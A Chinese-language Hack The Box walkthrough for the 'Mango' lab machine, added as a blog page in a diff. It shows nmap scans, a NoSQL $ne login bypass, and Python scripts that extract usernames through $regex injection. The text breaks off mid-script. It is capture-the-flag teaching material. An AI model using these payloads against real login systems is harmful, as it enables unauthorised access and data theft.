@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="介绍操作系统：Linux难度：中等点数：30发行：2019年10月26日IP：10.10.10.162 user一血用时：04小时28分58秒。root一血用时：05小时14分45秒。 看来是真特么的耗时间">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[mango]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/04/20/mango/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="介绍操作系统：Linux难度：中等点数：30发行：2019年10月26日IP：10.10.10.162 user一血用时：04小时28分58秒。root一血用时：05小时14分45秒。 看来是真特么的耗时间">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb15.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb16.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb17.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb18.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb19.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb20.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb21.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb22.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb23.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-04-20T08:03:00.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:52:59.054Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/04/20/mango/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/04/20/mango/","path":"2020/04/20/mango/","title":"Hack-The-Box-walkthrough[mango]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[mango] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">MongoDB注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A5%E4%B8%8A%E9%9D%A2%E4%BD%BF%E7%94%A8python%E8%84%9A%E6%9C%ACfuzz%E5%87%BA%E7%9A%84%E4%BF%A1%E6%81%AF%E7%AB%8B%E8%B6%B3%EF%BC%8C%E7%88%86%E7%A0%B4%E4%B8%A4%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell-amp-%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">getshell &amp; 提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/04/20/mango/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[mango] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[mango]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-04-20 16:03:00" itemprop="dateCreated datePublished" datetime="2020-04-20T16:03:00+08:00">2020-04-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:52:59" itemprop="dateModified" datetime="2020-08-17T00:52:59+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>操作系统：Linux<br>难度：中等<br>点数：30<br>发行：2019年10月26日<br>IP：10.10.10.162</p>
+<p>user一血用时：04小时28分58秒。<br>root一血用时：05小时14分45秒。</p>
+<p>看来是真特么的耗时间</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg"></li>
+<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- --min-rate=1000 -T4 -v -sV 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 22,80,443 -A -v 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">| Not valid after:  2020-09-26T14:21:19</span><br><span class="line">| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6</span><br><span class="line">|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br></pre></td></tr></table></figure>
+
+<p>Nmap扫描显示运行其通常服务的端口22、80和443。此外，Nmap还发现了一个名为stage -order.mango的vhost。在SSL证书中提到的htb。添加mango.htb和staging-order.mango.htb到&#x2F;etc&#x2F;hosts，然后继续枚举。</p>
+<p>浏览到端口80将返回一个403禁止错误，然而，HTTPS网站显示了一个搜索引擎。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb15.jpg"></li>
+</ul>
+<p>页面只是刷新，搜索时不返回任何结果。第二个vhost在HTTPS上托管返回相同的页面。然而，HTTP网站却只是显示了一个登录页面。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb16.jpg"></li>
+</ul>
+<p>尝试使用通用默认凭据登录失败。在Burp中拦截请求并检查登录请求。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb17.jpg"></li>
+</ul>
+<p>注入引号没有返回错误或改变响应。由于网站正在运行PHP，可以尝试使用类型杂耍绕过身份验证。<br>这可以通过向请求参数添加[]来实现，这使得PHP将它们作为数组使用。如果存在任何弱比较，则将绕过身份验证。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb18.jpg"></li>
+</ul>
+<p>会导致失败的尝试。尝试一下NoSQL注入攻击，比如MongoDB身份验证绕过。MongoDB使用$ne (not equal)操作符来比较值。这个操作符可以通过数组语法传递给PHP，它最终会被注入到MongoDB查询中。</p>
+<p>这是一个例子MongoDB查询找到一个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: <span class="string">&quot;admin&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询将导致由于密码错误而导致登录失败。发送参数password[$ne]&#x3D;admin的请求将导致查询:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这将返回true，因为admin的密码不等于admin，会成功地绕过登录。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb19.jpg"></li>
+</ul>
+<p>$ne的注入被发现是成功的，并且页面将重定向到home.php作为admin。使用登录请求重复相同的过程将返回以下页面。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb20.jpg"></li>
+</ul>
+<h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><p>因为主页没有返回任何有用的信息。可以尝试使用$regex操作符从Mongo数据库中提取数据。$regex操作符可用于使用正则表达式查找数据。</p>
+<p>例如，下面的查询将搜索匹配</p>
+<p>regex a.*</p>
+<p>的用户名，匹配任何包含a的用户名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123; username: &#123; <span class="variable">$regex</span> : <span class="string">&quot;a.*&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb21.jpg"></li>
+</ul>
+<p>用b.*替换a.*返回200响应，这意味着没有包含b的用户名。编写一个使用此逻辑发现用户名的脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> lowercase:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found valid letter: &#123;&#125;&quot;</span>.format(char)</span><br><span class="line">def getUser():</span><br><span class="line">    sendPayload()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
+
+<p>代码已经缩进好了，直接复制粘贴就可以使用</p>
+<p>运行代码，列出DB中所有用户名中出现的所有字符。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Found valid letter: a</span><br><span class="line">Found valid letter: d</span><br><span class="line">Found valid letter: g</span><br><span class="line">Found valid letter: i</span><br><span class="line">Found valid letter: m</span><br><span class="line">Found valid letter: n</span><br><span class="line">Found valid letter: o</span><br></pre></td></tr></table></figure>
+
+<p>脚本发现了7个有效字符，即a、d、g、i、m、n、o。现在已经减少了字符集，可以尝试显示实际的用户名。regex中的插入符号^用于标记单词的开头。例如，模式^a.*仅当用户名以a开头时才返回true。<br>类似地，模式^ad.*如果以ad开头的用户名存在，则返回true，以此类推。使用这个逻辑更新脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word)</span><br><span class="line">    data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">    response = post(url, data = data, allow_redirects=False)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">        <span class="built_in">return</span> word</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">if</span> sendPayload(char) != None:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found username starting with &#123;&#125;&quot;</span>.format(char)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
+<p>脚本循环遍历字符集，查找以这些字母中的任何一个开头的用户名。<br>运行脚本后出现下面的结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Found username starting with a</span><br><span class="line">Found username starting with m</span><br></pre></td></tr></table></figure>
+
+<p>发现DB分别包含以a和m开头的用户名。更新脚本以显示真正的用户名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span 